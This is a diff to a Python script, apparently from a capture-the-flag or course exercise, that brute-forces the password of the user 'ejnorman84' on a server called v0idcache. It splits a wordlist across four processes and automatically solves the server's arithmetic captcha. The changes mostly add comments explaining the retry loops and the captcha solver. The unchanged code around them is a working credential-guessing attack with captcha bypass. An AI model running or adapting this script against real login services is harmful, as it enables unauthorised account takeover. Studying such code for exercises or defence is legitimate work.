@@ -57,7 +57,7 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             v0idcache's server.
     """
-
+    # Sets up four processes to read passwords
     f = open(wordlist, "r")
     lines = f.readlines()
     p1 = Process(target=guess, args=(0,len(lines)/4,lines,))
@@ -74,14 +74,16 @@ def brute_force():
     p2.join()
     p3.join()
     p4.join()
-   #guess(0,len(lines),lines)
 
+# Function to run through part of the password list and submit guesses
 def guess (start, end, lines):
     username = "ejnorman84"
 
     for pwd in lines[start:end]:
         flag = False
         s = 0
+        # I was having trouble with the captcha breaker sometimes not getting all the data
+        # and crashing. My solution was to just keep doing it until it worked
         while not flag: 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
@@ -95,6 +97,8 @@ def guess (start, end, lines):
         s.recv(1024)
         s.send(pwd)
         response = s.recv(1024)
+        # This while loop makes the script keep taking data until it gets something
+        # Originally it gave me way more false positives
         while response == "\n" or response == "" or response == " ":
             time.sleep(0.05)
             response = s.recv(1024)
@@ -106,18 +110,18 @@ def guess (start, end, lines):
 
 
 
-
+# this function parses and solves the captcha
 def beatcaptcha (s):
     captcha = s.recv(1024)
-#   print captcha
     num = re.findall("\d+", captcha)
-#   print num
+    # If the recv didn't get the whole captcha, return false and try again
     try:
         op = re.search("[+-/*]", captcha).group(0)
     except:
         return False
     x = 0;
 
+    # no switch statement :(
     if op == "+":
         x = int(num[0]) + int(num[1])
     if op == "-":
@@ -128,7 +132,6 @@ def beatcaptcha (s):
         x = int(num[0]) * int(num[1])
 
     s.send(str(x) + "\n")
-#   print("sent " + str(x))
     return True
 
 
